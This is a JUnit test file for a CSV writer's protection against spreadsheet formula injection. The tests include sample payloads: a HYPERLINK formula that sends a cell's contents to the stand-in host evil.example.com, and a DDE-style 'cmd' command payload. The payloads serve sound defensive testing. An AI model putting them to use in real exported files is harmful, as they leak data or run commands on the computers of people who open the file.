/*
 *
 * Copyright 2026 Odysseus Data Services, Inc. (EPAM Systems company)
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 * Company: Odysseus Data Services, Inc.
 * Created: July 30, 2026
 *
 */

package com.odysseusinc.athena.service.impl;

import org.junit.Test;

import java.io.StringWriter;

import static org.junit.Assert.assertEquals;

public class CsvFormulaInjectionTest {

    private String write(boolean neutralise, Object... values) throws Exception {

        StringWriter out = new StringWriter();
        try (AthenaCSVWriter writer = new AthenaCSVWriter(out, ',', neutralise)) {
            writer.writeNext(values);
        }
        return out.toString();
    }

    @Test
    public void aFormulaIsNeutralised() throws Exception {

        assertEquals("'=1+1\n", write(true, "=1+1"));
    }

    /** The realistic payload: exfiltrating the row to an attacker-controlled URL. */
    @Test
    public void aHyperlinkExfiltrationPayloadIsNeutralised() throws Exception {

        assertEquals("'=HYPERLINK(\"http://evil.example.com?d=\"&A1,\"click\")\n",
                write(true, "=HYPERLINK(\"http://evil.example.com?d=\"&A1,\"click\")"));
    }

    @Test
    public void everyTriggerCharacterIsNeutralised() throws Exception {

        assertEquals("'=a\n", write(true, "=a"));
        assertEquals("'+a\n", write(true, "+a"));
        assertEquals("'@a\n", write(true, "@a"));
        assertEquals("'\ta\n", write(true, "\ta"));
        assertEquals("'\ra\n", write(true, "\ra"));
    }

    /** A minus that starts an expression rather than a number still has to be caught. */
    @Test
    public void aLeadingMinusIsNeutralisedWhenItIsNotANumber() throws Exception {

        assertEquals("'-1+1\n", write(true, "-1+1"));
        assertEquals("'-cmd|'/c calc'!A1\n", write(true, "-cmd|'/c calc'!A1"));
    }

    /** ...but a plain negative number must stay numeric, or the column stops sorting. */
    @Test
    public void aNegativeNumberIsLeftAlone() throws Exception {

        assertEquals("-42\n", write(true, "-42"));
        assertEquals("-3.14\n", write(true, "-3.14"));
    }

    @Test
    public void ordinaryValuesAreUntouched() throws Exception {

        assertEquals("Aspirin,2026-01-01,ohdsi\n", write(true, "Aspirin", "2026-01-01", "ohdsi"));
    }

    @Test
    public void aTriggerCharacterInTheMiddleIsNotAFormula() throws Exception {

        assertEquals("a=b\n", write(true, "a=b"));
    }

    @Test
    public void nullsAndEmptyValuesSurviveNeutralisation() throws Exception {

        assertEquals("a,,b\n", write(true, "a", null, "b"));
        assertEquals(",\n", write(true, "", ""));
    }

    /**
     * The guard on the bundle files: with the flag off, output is byte-for-byte what it was.
     * If this ever starts failing, the vocabulary CSVs have changed shape.
     */
    @Test
    public void theBundleFilesAreUnaffected() throws Exception {

        assertEquals("=1+1\n", write(false, "=1+1"));
        assertEquals("-1+1\n", write(false, "-1+1"));
        assertEquals("@a\n", write(false, "@a"));
    }

    /** And the default constructor must stay the unneutralised one. */
    @Test
    public void neutralisationIsOffByDefault() throws Exception {

        StringWriter out = new StringWriter();
        try (AthenaCSVWriter writer = new AthenaCSVWriter(out, ',')) {
            writer.writeNext(new Object[]{"=1+1"});
        }
        assertEquals("=1+1\n", out.toString());
    }
}
